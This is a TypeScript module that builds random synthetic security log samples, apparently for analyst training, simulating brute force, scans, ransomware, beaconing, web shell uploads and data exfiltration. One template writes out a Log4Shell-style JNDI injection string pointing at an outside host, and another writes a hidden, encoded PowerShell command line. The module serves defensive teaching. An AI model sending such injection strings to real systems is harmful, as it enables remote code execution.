const pick = <T,>(a: T[]) => a[Math.floor(Math.random() * a.length)];
const n = (a: number, b: number) => a + Math.floor(Math.random() * (b - a + 1));
const ip = () => `${pick([45, 91, 185, 103, 194, 77, 162])}.${n(1, 254)}.${n(1, 254)}.${n(1, 254)}`;
const lan = () => `10.0.${n(0, 9)}.${n(2, 250)}`;
const host = () => pick(["web01", "db02", "dc01", "app03", "mail01", "fs02", "vpn01"]);
const user = () => pick(["admin", "root", "jdoe", "svc_backup", "oracle", "test", "asmith", "deploy"]);
const hex = (len: number) => Array.from({ length: len }, () => n(0, 15).toString(16)).join("");
const ts = (offset = 0) => {
  const d = new Date(Date.now() - n(0, 3600) * 1000 + offset * 1000);
  return d.toLocaleString("en-US", { month: "short", day: "2-digit", hour: "2-digit", minute: "2-digit", second: "2-digit", hour12: false }).replace(",", "");
};

const TEMPLATES: (() => string)[] = [
  () => {
    const a = ip(), u = user(), h = host(), c = n(3, 15);
    return Array.from({ length: c }, (_, i) => `${ts(i)} ${h} sshd[${n(1000, 9999)}]: Failed password for invalid user ${u} from ${a} port ${n(40000, 65000)} ssh2`).join("\n");
  },
  () => {
    const a = ip(), u = user(), h = host();
    return `${ts()} ${h} sshd[${n(1000, 9999)}]: Failed password for ${u} from ${a} port ${n(40000, 65000)} ssh2\n${ts(5)} ${h} sshd[${n(1000, 9999)}]: Accepted password for root from ${a} port ${n(40000, 65000)} ssh2`;
  },
  () => `${ts()} fw01 kernel: [UFW BLOCK] SRC=${ip()} DST=${lan()} PROTO=TCP SPT=${n(30000, 60000)} DPT=${pick([22, 23, 445, 3389, 8080])} SYN\nIDS alert: ET SCAN Nmap SYN scan detected, ${n(200, 3000)} ports probed in ${n(5, 60)}s`,
  () => `${ts()} ${host()} Sysmon EventID=1: Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe CommandLine="powershell -nop -w hidden -enc ${btoa(hex(24))}" User=CORP\\${user()}`,
  () => `${ts()} ${host()} EDR: Process ${pick(["svch0st.exe", "tasksche.exe", "update.exe"])} renamed ${n(500, 9000)} files to *.locked in C:\\Users\\${user()}\\Documents; ransom note README_RESTORE.txt created`,
  () => `${ts()} proxy01 squid: ${lan()} CONNECT ${ip()}:4444 - beacon interval ${n(30, 120)}s jitter ${n(5, 20)}% (${n(40, 300)} connections in last hour)`,
  () => `${ts()} nginx: ${ip()} - - "POST /uploads/${pick(["shell", "cmd", "img"])}${n(1, 99)}.php HTTP/1.1" 200 ${n(200, 900)} "-" "curl/7.${n(60, 88)}"`,
  () => `${ts()} ${host()} sudo: ${user()} : command not allowed ; TTY=pts/${n(0, 5)} ; USER=root ; COMMAND=/tmp/exploit_cve-2021-${n(3000, 4999)}`,
  () => `${ts()} dlp: ${n(2, 40)} GB uploaded from ${lan()} (user ${user()}) to ${ip()} over HTTPS outside business hours`,
  () => `${ts()} ${host()} AIDE: hash mismatch for /usr/bin/${pick(["ssh", "ls", "ps"])} sha256=${hex(64)}`,
  () => `${ts()} ${host()} Security EventID=4688: psexec.exe launched on \\\\${host()} by CORP\\${user()} via SMB from ${lan()}`,
  () => `${ts()} ${host()} app: unusual JNDI string in header User-Agent "\${jndi:ldap://${ip()}:1389/${hex(6)}}" from ${ip()}`,
];

let last = -1;
export function randomSampleLog(): string {
  let i = n(0, TEMPLATES.length - 1);
  if (i === last) i = (i + 1) % TEMPLATES.length;
  last = i;
  return TEMPLATES[i]();
}
